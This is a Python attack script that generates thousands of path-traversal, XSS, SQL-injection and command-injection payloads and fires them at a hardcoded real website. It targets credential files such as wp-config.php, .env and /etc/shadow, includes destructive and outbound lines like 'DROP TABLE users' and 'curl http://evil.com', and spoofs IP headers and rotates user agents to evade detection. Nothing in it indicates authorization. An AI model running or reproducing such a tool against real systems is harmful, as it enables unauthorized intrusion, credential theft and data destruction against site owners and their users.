#!/usr/bin/env python3
"""
Comprehensive Payload Tester - 5000 Variations
Tests exactly 5000 payload variations against the target website
Stops immediately if successful, otherwise continues until completion
"""

import requests
import urllib.parse
import base64
import html
import json
import time
import random
import string
from typing import List, Dict, Any
import re
from datetime import datetime
import hashlib

class ComprehensivePayloadTester:
    def __init__(self, target_url: str, timeout: int = 10):
        self.target_url = target_url
        self.timeout = timeout
        self.session = requests.Session()
        self.total_tests = 0
        self.successful_payloads = []
        self.blocked_count = 0
        self.error_count = 0
        self.test_log = []
        self.max_tests = 5000
        
        # Rotate User Agents
        self.user_agents = [
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36',
            'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36',
            'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36',
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:89.0) Gecko/20100101 Firefox/89.0',
            'Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:89.0) Gecko/20100101 Firefox/89.0',
            'Mozilla/5.0 (X11; Linux x86_64; rv:89.0) Gecko/20100101 Firefox/89.0',
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Edge/91.0.864.59',
            'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1.1 Safari/605.1.15'
        ]
        
    def get_random_headers(self):
        """Generate random headers to avoid detection"""
        return {
            'User-Agent': random.choice(self.user_agents),
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
            'Accept-Language': random.choice(['en-US,en;q=0.5', 'th-TH,th;q=0.8,en-US;q=0.5,en;q=0.3']),
            'Accept-Encoding': 'gzip, deflate',
            'Connection': 'keep-alive',
            'Upgrade-Insecure-Requests': '1',
            'Cache-Control': random.choice(['no-cache', 'max-age=0']),
            'Pragma': random.choice(['no-cache', '']),
            'X-Forwarded-For': f"{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}",
            'X-Real-IP': f"{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}",
            'X-Originating-IP': f"{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}"
        }
    
    def generate_lfi_payloads(self) -> List[str]:
        """Generate comprehensive LFI payloads"""
        payloads = []
        
        # Base files to target
        target_files = [
            'wp-config.php', 'config.php', '.env', 'database.php',
            'etc/passwd', 'etc/shadow', 'etc/hosts', 'etc/group',
            'var/log/apache2/access.log', 'var/log/nginx/access.log',
            'proc/self/environ', 'proc/version', 'proc/cmdline',
            'home/user/.bash_history', 'root/.bash_history',
            'var/www/html/index.php', 'index.php', 'admin.php',
            'login.php', 'config.inc.php', 'configuration.php'
        ]
        
        # Path traversal patterns
        traversal_patterns = [
            '../', '..\\', '..../', '....\\',
            '..;/', '..;\\', '..%2f', '..%5c',
            '..%252f', '..%255c', '..%c0%af', '..%c1%9c',
            '.%2e/', '.%2e\\', '%2e%2e/', '%2e%2e\\',
            '%252e%252e/', '%252e%252e\\', '%c0%2e%c0%2e/',
            '0x2e0x2e/', '..%00/', '..%0a/', '..%0d/',
        ]
        
        # Depths to try
        depths = [1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 15, 20]
        
        # Generate combinations
        for file in target_files:
            for pattern in traversal_patterns:
                for depth in depths:
                    payload = pattern * depth + file
                    payloads.append(payload)
                    
                    # Add null byte variations
                    payloads.append(payload + '%00')
                    payloads.append(payload + '\x00')
                    payloads.append(payload + '%00.jpg')
                    payloads.append(payload + '%00.txt')
        
        # PHP wrappers
        php_wrappers = [
            'php://filter/convert.base64-encode/resource=',
            'php://filter/read=convert.base64-encode/resource=',
            'php://filter/convert.quoted-printable-encode/resource=',
            'php://filter/zlib.deflate/convert.base64-encode/resource=',
            'php://input', 'php://stdin', 'php://memory',
            'file://', 'data://', 'expect://', 'zip://',
            'compress.zlib://', 'compress.bzip2://'
        ]
        
        for wrapper in php_wrappers:
            for file in target_files[:5]:  # Limit for wrappers
                payloads.append(wrapper + file)
        
        return payloads
    
    def generate_xss_payloads(self) -> List[str]:
        """Generate comprehensive XSS payloads"""
        payloads = []
        
        # Basic XSS patterns
        basic_xss = [
            "<script>alert('XSS')</script>",
            "<img src=x onerror=alert('XSS')>",
            "<svg onload=alert('XSS')>",
            "<iframe src=javascript:alert('XSS')>",
            "<body onload=alert('XSS')>",
            "<input onfocus=alert('XSS') autofocus>",
            "<select onfocus=alert('XSS') autofocus>",
            "<textarea onfocus=alert('XSS') autofocus>",
            "<keygen onfocus=alert('XSS') autofocus>",
            "<video><source onerror=alert('XSS')>",
            "<audio src=x onerror=alert('XSS')>",
            "<details open ontoggle=alert('XSS')>",
            "<marquee onstart=alert('XSS')>",
            "javascript:alert('XSS')",
            "';alert('XSS');//",
            "\";alert('XSS');//",
            "</script><script>alert('XSS')</script>",
            "<script>eval(String.fromCharCode(97,108,101,114,116,40,39,88,83,83,39,41))</script>",
        ]
        
        # Event handlers
        events = [
            'onload', 'onerror', 'onclick', 'onmouseover', 'onfocus',
            'onblur', 'onchange', 'onsubmit', 'onreset', 'onselect',
            'onkeydown', 'onkeyup', 'onkeypress', 'onmousedown',
            'onmouseup', 'onmousemove', 'onmouseout', 'oncontextmenu'
        ]
        
        # HTML tags
        tags = [
            'img', 'svg', 'iframe', 'object', 'embed', 'applet',
            'form', 'input', 'button', 'select', 'textarea',
            'video', 'audio', 'source', 'track', 'canvas'
        ]
        
        # Generate event-based XSS
        for tag in tags:
            for event in events:
                payloads.append(f"<{tag} {event}=alert('XSS')>")
                payloads.append(f"<{tag} {event}='alert(\"XSS\")'>")
                payloads.append(f"<{tag} {event}=javascript:alert('XSS')>")
        
        # Add basic payloads
        payloads.extend(basic_xss)
        
        # Obfuscation techniques
        obfuscated = []
        for payload in basic_xss[:10]:  # Limit for performance
            # Character encoding
            obfuscated.append(''.join(f'&#x{ord(c):x};' for c in payload))
            obfuscated.append(''.join(f'&#{ord(c)};' for c in payload))
            
            # Case variations
            obfuscated.append(payload.upper())
            obfuscated.append(''.join(c.upper() if i % 2 == 0 else c.lower() for i, c in enumerate(payload)))
            
            # Comment insertion
            obfuscated.append(payload.replace('>', '/**/>')
                            .replace('<', '</**/'))
        
        payloads.extend(obfuscated)
        return payloads
    
    def generate_sqli_payloads(self) -> List[str]:
        """Generate SQL injection payloads"""
        payloads = [
            "' OR '1'='1",
            "' OR 1=1--",
            "' OR 1=1#",
            "' OR 1=1/*",
            "admin'--",
            "admin'#",
            "admin'/*",
            "' OR 'x'='x",
            "' OR 'a'='a",
            "') OR ('1'='1",
            "') OR (1=1)--",
            "1' OR '1'='1",
            "1' OR 1=1--",
            "1' OR 1=1#",
            "1 OR 1=1",
            "1 OR 1=1--",
            "1 OR 1=1#",
            "' UNION SELECT NULL--",
            "' UNION SELECT 1,2,3--",
            "' UNION ALL SELECT NULL--",
            "1' UNION SELECT NULL--",
            "1' UNION SELECT 1,2,3--",
            "' AND 1=1--",
            "' AND 1=2--",
            "1' AND 1=1--",
            "1' AND 1=2--",
            "' ORDER BY 1--",
            "' ORDER BY 2--",
            "' ORDER BY 3--",
            "'; DROP TABLE users--",
            "'; EXEC xp_cmdshell('dir')--",
            "' AND (SELECT COUNT(*) FROM users)>0--",
            "' AND SUBSTRING(@@version,1,1)='5'--",
            "' WAITFOR DELAY '00:00:05'--",
            "'; WAITFOR DELAY '00:00:05'--",
            "1; WAITFOR DELAY '00:00:05'--",
            "' AND SLEEP(5)--",
            "1' AND SLEEP(5)--",
            "' OR SLEEP(5)--",
            "1 OR SLEEP(5)--"
        ]
        return payloads
    
    def generate_command_injection_payloads(self) -> List[str]:
        """Generate command injection payloads"""
        payloads = [
            "; ls -la",
            "| ls -la",
            "&& ls -la",
            "|| ls -la",
            "; cat /etc/passwd",
            "| cat /etc/passwd",
            "&& cat /etc/passwd",
            "|| cat /etc/passwd",
            "; whoami",
            "| whoami",
            "&& whoami",
            "|| whoami",
            "; id",
            "| id",
            "&& id",
            "|| id",
            "; pwd",
            "| pwd",
            "&& pwd",
            "|| pwd",
            "`ls -la`",
            "$(ls -la)",
            "`cat /etc/passwd`",
            "$(cat /etc/passwd)",
            "`whoami`",
            "$(whoami)",
            "`id`",
            "$(id)",
            "`pwd`",
            "$(pwd)",
            "; ping -c 4 127.0.0.1",
            "| ping -c 4 127.0.0.1",
            "&& ping -c 4 127.0.0.1",
            "|| ping -c 4 127.0.0.1",
            "; curl http://evil.com",
            "| curl http://evil.com",
            "&& curl http://evil.com",
            "|| curl http://evil.com"
        ]
        return payloads
    
    def apply_encoding_variations(self, payloads: List[str]) -> List[str]:
        """Apply various encoding techniques to payloads"""
        encoded_payloads = []
        
        for payload in payloads:
            # Original
            encoded_payloads.append(payload)
            
            # URL encoding
            encoded_payloads.append(urllib.parse.quote(payload))
            encoded_payloads.append(urllib.parse.quote(urllib.parse.quote(payload)))
            
            # HTML encoding
            encoded_payloads.append(html.escape(payload))
            
            # Base64 encoding
            try:
                b64_payload = base64.b64encode(payload.encode()).decode()
                encoded_payloads.append(b64_payload)
            except:
                pass
            
            # Mixed case
            encoded_payloads.append(payload.upper())
            encoded_payloads.append(payload.lower())
            
            # Hex encoding
            hex_payload = ''.join(f'%{ord(c):02x}' for c in payload)
            encoded_payloads.append(hex_payload)
            
            # Unicode encoding
            unicode_payload = ''.join(f'\\u{ord(c):04x}' for c in payload if ord(c) < 65536)
            if unicode_payload:
                encoded_payloads.append(unicode_payload)
        
        return encoded_payloads
    
    def test_payload(self, endpoint: str, param: str, payload: str, method: str = 'GET') -> Dict[str, Any]:
        """Test a single payload"""
        self.total_tests += 1
        
        headers = self.get_random_headers()
        url = f"{self.target_url}/{endpoint}"
        
        result = {
            'test_number': self.total_tests,
            'timestamp': datetime.now().isoformat(),
            'url': url,
            'method': method,
            'parameter': param,
            'payload': payload,
            'payload_hash': hashlib.md5(payload.encode()).hexdigest()[:8],
            'status_code': None,
            'response_length': 0,
            'response_time': 0,
            'blocked': False,
            'success': False,
            'error': None,
            'response_preview': ''
        }
        
        try:
            start_time = time.time()
            
            if method.upper() == 'POST':
                data = {param: payload}
                response = self.session.post(url, data=data, headers=headers, timeout=self.timeout)
            else:
                params = {param: payload}
                response = self.session.get(url, params=params, headers=headers, timeout=self.timeout)
            
            end_time = time.time()
            result['response_time'] = round(end_time - start_time, 3)
            result['status_code'] = response.status_code
            result['response_length'] = len(response.text)
            result['response_preview'] = response.text[:200]
            
            # Check for blocking indicators
            blocking_indicators = [
                'cloudflare', 'blocked', 'forbidden', '403', 'access denied',
                'security', 'firewall', 'waf', 'protection', 'ray id'
            ]
            
            response_lower = response.text.lower()
            result['blocked'] = any(indicator in response_lower for indicator in blocking_indicators)
            
            # Check for success indicators (customize based on your application)
            success_indicators = [
                # For LFI
                'DB_PASSWORD', 'DB_HOST', 'DB_NAME', 'define(', 'root:x:0:0',
                'www-data', '/bin/bash', '/bin/sh', 'mysql', 'localhost',
                
                # For XSS (in response)
                '<script>', 'alert(', 'javascript:', 'onerror=',
                
                # For SQLi
                'mysql_fetch', 'ORA-', 'Microsoft OLE DB', 'ODBC SQL',
                'PostgreSQL', 'Warning: mysql', 'valid MySQL result',
                
                # For Command Injection
                'uid=', 'gid=', 'groups=', 'total ', 'drwx', '-rw-'
            ]
            
            # Check if payload was executed successfully
            if response.status_code == 200 and not result['blocked']:
                for indicator in success_indicators:
                    if indicator in response.text:
                        result['success'] = True
                        self.successful_payloads.append(result)
                        break
            
            if result['blocked']:
                self.blocked_count += 1
                
        except requests.exceptions.RequestException as e:
            result['error'] = str(e)
            self.error_count += 1
        
        # Log the test
        self.test_log.append(result)
        
        # Print progress
        if self.total_tests % 100 == 0:
            print(f"Progress: {self.total_tests}/{self.max_tests} tests completed")
            print(f"Successful: {len(self.successful_payloads)}, Blocked: {self.blocked_count}, Errors: {self.error_count}")
            print("-" * 60)
        
        # Add random delay to avoid rate limiting
        time.sleep(random.uniform(0.1, 0.5))
        
        return result
    
    def run_comprehensive_test(self) -> Dict[str, Any]:
        """Run comprehensive testing with 5000 payload variations"""
        print("🚀 Starting Comprehensive Payload Testing - 5000 Variations")
        print("=" * 80)
        print(f"Target: {self.target_url}")
        print(f"Max Tests: {self.max_tests}")
        print(f"Start Time: {datetime.now()}")
        print("=" * 80)
        
        # Generate all payload types
        print("📝 Generating payloads...")
        lfi_payloads = self.generate_lfi_payloads()
        xss_payloads = self.generate_xss_payloads()
        sqli_payloads = self.generate_sqli_payloads()
        cmdi_payloads = self.generate_command_injection_payloads()
        
        print(f"Generated {len(lfi_payloads)} LFI payloads")
        print(f"Generated {len(xss_payloads)} XSS payloads")
        print(f"Generated {len(sqli_payloads)} SQLi payloads")
        print(f"Generated {len(cmdi_payloads)} Command Injection payloads")
        
        # Apply encoding variations
        print("🔄 Applying encoding variations...")
        all_payloads = []
        all_payloads.extend(self.apply_encoding_variations(lfi_payloads[:200]))  # Limit for performance
        all_payloads.extend(self.apply_encoding_variations(xss_payloads[:200]))
        all_payloads.extend(self.apply_encoding_variations(sqli_payloads))
        all_payloads.extend(self.apply_encoding_variations(cmdi_payloads))
        
        # Shuffle payloads for better testing distribution
        random.shuffle(all_payloads)
        
        # Limit to exactly 5000 payloads
        if len(all_payloads) > self.max_tests:
            all_payloads = all_payloads[:self.max_tests]
        elif len(all_payloads) < self.max_tests:
            # Duplicate payloads to reach 5000
            while len(all_payloads) < self.max_tests:
                all_payloads.extend(all_payloads[:min(len(all_payloads), self.max_tests - len(all_payloads))])
        
        print(f"📊 Total payloads to test: {len(all_payloads)}")
        print("🔥 Starting tests...")
        print()
        
        # Test endpoints and parameters
        test_endpoints = [
            ('index.php', 'page'),
            ('index.php', 'file'),
            ('index.php', 'include'),
            ('index.php', 'path'),
            ('search.php', 'q'),
            ('search.php', 'query'),
            ('search.php', 'search'),
            ('login.php', 'username'),
            ('login.php', 'password'),
            ('admin.php', 'id'),
            ('view.php', 'id'),
            ('show.php', 'id'),
            ('user.php', 'id'),
            ('profile.php', 'user'),
            ('download.php', 'file'),
            ('upload.php', 'name'),
            ('contact.php', 'message'),
            ('comment.php', 'comment'),
            ('news.php', 'id'),
            ('article.php', 'id')
        ]
        
        # Test each payload
        for i, payload in enumerate(all_payloads):
            if self.total_tests >= self.max_tests:
                break
                
            # Select random endpoint and parameter
            endpoint, param = random.choice(test_endpoints)
            method = random.choice(['GET', 'POST'])
            
            # Test the payload
            result = self.test_payload(endpoint, param, payload, method)
            
            # If successful, stop immediately
            if result['success']:
                print(f"🎯 SUCCESS FOUND! Stopping at test #{self.total_tests}")
                print(f"Successful payload: {payload}")
                print(f"Endpoint: {endpoint}, Parameter: {param}")
                break
        
        # Generate final report
        return self.generate_final_report()
    
    def generate_final_report(self) -> Dict[str, Any]:
        """Generate comprehensive final report"""
        end_time = datetime.now()
        
        report = {
            'summary': {
                'total_tests_conducted': self.total_tests,
                'max_tests_planned': self.max_tests,
                'tests_completed': self.total_tests >= self.max_tests,
                'successful_payloads_found': len(self.successful_payloads),
                'blocked_requests': self.blocked_count,
                'error_requests': self.error_count,
                'success_rate': (len(self.successful_payloads) / self.total_tests * 100) if self.total_tests > 0 else 0,
                'block_rate': (self.blocked_count / self.total_tests * 100) if self.total_tests > 0 else 0,
                'end_time': end_time.isoformat()
            },
            'successful_payloads': self.successful_payloads,
            'test_log': self.test_log
        }
        
        return report
    
    def save_results(self, report: Dict[str, Any], filename: str = None):
        """Save test results to file"""
        if filename is None:
            timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
            filename = f"payload_test_results_{timestamp}.json"
        
        with open(filename, 'w', encoding='utf-8') as f:
            json.dump(report, f, indent=2, ensure_ascii=False)
        
        return filename
    
    def print_final_summary(self, report: Dict[str, Any]):
        """Print final test summary"""
        print("\n" + "=" * 80)
        print("🏁 COMPREHENSIVE PAYLOAD TESTING COMPLETED")
        print("=" * 80)
        
        summary = report['summary']
        
        print(f"📊 FINAL STATISTICS:")
        print(f"   Total Tests Conducted: {summary['total_tests_conducted']}")
        print(f"   Tests Planned: {summary['max_tests_planned']}")
        print(f"   Tests Completed: {'✅ YES' if summary['tests_completed'] else '❌ NO'}")
        print(f"   Successful Payloads: {summary['successful_payloads_found']}")
        print(f"   Blocked Requests: {summary['blocked_requests']}")
        print(f"   Error Requests: {summary['error_requests']}")
        print(f"   Success Rate: {summary['success_rate']:.2f}%")
        print(f"   Block Rate: {summary['block_rate']:.2f}%")
        
        if summary['successful_payloads_found'] > 0:
            print(f"\n🎯 SUCCESSFUL PAYLOADS FOUND:")
            for i, payload_result in enumerate(report['successful_payloads'], 1):
                print(f"   {i}. Test #{payload_result['test_number']}")
                print(f"      Endpoint: {payload_result['url']}")
                print(f"      Parameter: {payload_result['parameter']}")
                print(f"      Payload: {payload_result['payload'][:100]}...")
                print(f"      Status: {payload_result['status_code']}")
                print(f"      Response Length: {payload_result['response_length']} bytes")
                print()
        else:
            print(f"\n❌ NO SUCCESSFUL PAYLOADS FOUND")
            print(f"   The target website appears to have strong security protection.")
            print(f"   All {summary['total_tests_conducted']} payload variations were blocked or failed.")
        
        print("=" * 80)

def main():
    target_url = "https://pakyok77.link"
    
    print("🔥 COMPREHENSIVE PAYLOAD TESTER")
    print("Testing 5000 payload variations")
    print("Will stop immediately if successful payload is found")
    print("Otherwise will continue until all 5000 tests are completed")
    print()
    
    tester = ComprehensivePayloadTester(target_url)
    
    try:
        # Run comprehensive testing
        report = tester.run_comprehensive_test()
        
        # Save results
        filename = tester.save_results(report)
        print(f"\n💾 Results saved to: {filename}")
        
        # Print final summary
        tester.print_final_summary(report)
        
        # Additional evidence file
        evidence_filename = f"payload_evidence_{datetime.now().strftime('%Y%m%d_%H%M%S')}.txt"
        with open(evidence_filename, 'w', encoding='utf-8') as f:
            f.write("PAYLOAD TESTING EVIDENCE\n")
            f.write("=" * 50 + "\n")
            f.write(f"Target: {target_url}\n")
            f.write(f"Total Tests: {tester.total_tests}\n")
            f.write(f"Successful: {len(tester.successful_payloads)}\n")
            f.write(f"Blocked: {tester.blocked_count}\n")
            f.write(f"Errors: {tester.error_count}\n\n")
            
            f.write("PAYLOAD SAMPLES:\n")
            f.write("-" * 30 + "\n")
            for i, log_entry in enumerate(tester.test_log[:50], 1):  # First 50 as evidence
                f.write(f"{i}. {log_entry['payload'][:100]}...\n")
                f.write(f"   Status: {log_entry['status_code']}, Blocked: {log_entry['blocked']}\n\n")
        
        print(f"📋 Evidence file saved to: {evidence_filename}")
        
    except KeyboardInterrupt:
        print(f"\n⚠️  Testing interrupted by user at test #{tester.total_tests}")
        print(f"Partial results available - {len(tester.successful_payloads)} successful payloads found")
    except Exception as e:
        print(f"\n❌ Error during testing: {e}")
        print(f"Tests completed before error: {tester.total_tests}")

if __name__ == "__main__":
    main()